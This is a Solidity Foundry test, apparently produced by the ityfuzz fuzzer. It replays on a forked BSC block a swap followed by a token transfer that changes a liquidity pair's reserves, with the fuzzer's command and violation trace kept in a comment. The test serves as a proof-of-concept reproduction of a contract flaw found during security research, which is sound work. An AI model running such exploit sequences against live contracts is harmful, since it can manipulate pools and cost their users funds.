// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5,0x55d398326f99059fF775485246999027B3197955,0x7EFaEf62fDdCCa950418312c6C91Aef321375A00,0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e -c bsc --onchain-block-number 28466976 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0x6bc2823de2c3718d3669c2e7036e1d888c4107a1, Reserves changed from (0x0000000000000000000000000000000000000000000253ddb8097cfbbf2e58ec_U256, 0x00000000000000000000000000000000000000000001780c522e7e6eabdffb9b_U256) to (0x0000000000000000000000000000000000000000000253e4ece5313d58f7279a_U256, 0x00000000000000000000000000000000000000000001780c522e7e6eabdffb9b_U256)

================ Trace ================
[38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd[0m
   ├─[1] [38;2;0;118;255mRouter[0m.[38;2;255;123;114mswapExactETHForTokens[0m{value: [38;2;153;0;204m10.0 Ether[0m}(0, path:(WETH → [38;2;113;33;94m0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e[0m), address(this), block.timestamp);
   └─[1] [38;2;113;33;94m0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e[0m.[38;2;255;123;114mtransfer[0m([38;2;188;9;92m0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c[0m, 1397)


 */

contract C382e is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 28466976);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        address[] memory path0 = new address[](2);
        path0[0] = weth;
        path0[1] = 0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e;
        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 10000000000000000000);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 10000000000000000000
        }(0, path0, address(this), block.timestamp);
        
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e).transfer(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 1397);
        
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
